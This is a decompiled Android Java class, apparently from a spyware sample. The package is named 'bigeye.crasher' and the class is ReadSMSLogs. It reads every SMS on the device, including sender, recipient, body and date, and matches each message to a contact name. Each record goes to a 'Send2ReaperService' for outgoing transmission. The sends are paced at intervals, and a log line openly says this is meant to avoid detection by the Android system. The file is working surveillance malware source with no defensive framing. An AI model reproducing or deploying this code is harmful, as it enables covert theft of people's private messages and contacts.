package com.bigeye.crasher;

import android.app.IntentService;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;
import java.text.DateFormat;
import java.util.Calendar;
/* loaded from: classes.dex */
public class ReadSMSLogs extends IntentService {
    private static final long SLEEP_TIME = 5000;
    private final String APP_TAG = getClass().getSimpleName();
    final String prefName = "Sync";
    SharedPreferences sharedPrefs;

    public ReadSMSLogs() {
        super("Read SMS Logs");
    }

    @Override // android.app.IntentService
    protected void onHandleIntent(Intent intent) {
        this.sharedPrefs = getSharedPreferences("Sync", 0);
        boolean smsLogsSynced = this.sharedPrefs.getBoolean("smsLogsSynced", false);
        String lastSyncDate = this.sharedPrefs.getString("LastSMSLogsSyncDate", "NULL");
        if (smsLogsSynced) {
            Log.i(this.APP_TAG, "SMS Logs had been synced. Date: " + lastSyncDate);
            Log.i(this.APP_TAG, "commiting suicide");
            stopSelf();
        } else {
            Log.i(this.APP_TAG, "SMS Logs have NEVER been synced. Date: " + lastSyncDate);
            Log.i(this.APP_TAG, "About to start fetching all SMS logs: standby ");
            GetSMSLogs();
        }
        this.sharedPrefs = getSharedPreferences("Sync", 0);
        SharedPreferences.Editor editor = this.sharedPrefs.edit();
        editor.putBoolean("smsLogsSynced", true);
        editor.putString("LastSMSLogsSyncDate", DateFormat.getDateTimeInstance().format(Calendar.getInstance().getTime()));
        editor.commit();
        Log.i(this.APP_TAG, "finished reading all SMS logs: commiting suicide");
        stopSelf();
    }

    public void GetSMSLogs() {
        String[] projection = {"address", "date", "body", "type", "read"};
        try {
            Cursor cursor = getContentResolver().query(Uri.parse("content://sms"), projection, null, null, null);
            if (cursor.getCount() <= 0) {
                Log.i(this.APP_TAG, "SMS logs empty");
                cursor.close();
                return;
            }
            Log.i(this.APP_TAG, "found " + cursor.getCount() + " records");
            Log.i(this.APP_TAG, "about to start sending logs in 10 secs bursts - so as to avoid detection by android system!");
            while (cursor.moveToNext()) {
                String phoneNo = cursor.getString(cursor.getColumnIndex(projection[0]));
                Long date = Long.valueOf(cursor.getLong(cursor.getColumnIndex(projection[1])));
                String smsContent = cursor.getString(cursor.getColumnIndex(projection[2]));
                String type = cursor.getString(cursor.getColumnIndex(projection[3]));
                cursor.getString(cursor.getColumnIndex(projection[4]));
                String SMSLogStr = "";
                new android.text.format.DateFormat();
                String tmp_dt = android.text.format.DateFormat.format("dd-MMM-yyyy k:m:s", date.longValue()).toString();
                String name = new ReadContacts(getApplicationContext()).getContactName(phoneNo);
                if (name == "") {
                    name = "unknown";
                }
                if (type.equals("1")) {
                    SMSLogStr = "sms from <" + name + ">";
                } else if (type.equals("2")) {
                    SMSLogStr = "sms to <" + name + ">";
                }
                String SMSLogStr2 = SMSLogStr + phoneNo + ": " + smsContent + ":" + tmp_dt;
                Log.i(this.APP_TAG, SMSLogStr2);
                try {
                    new Thread();
                    Thread.sleep(SLEEP_TIME);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                Intent SvcIntent = new Intent(getApplicationContext(), Send2ReaperService.class);
                SvcIntent.putExtra("OPERATION", "OUTGOING");
                SvcIntent.putExtra("MSG", SMSLogStr2);
                startService(SvcIntent);
            }
            cursor.close();
        } catch (Exception e2) {
            Log.i(this.APP_TAG, e2.toString());
        }
    }
}
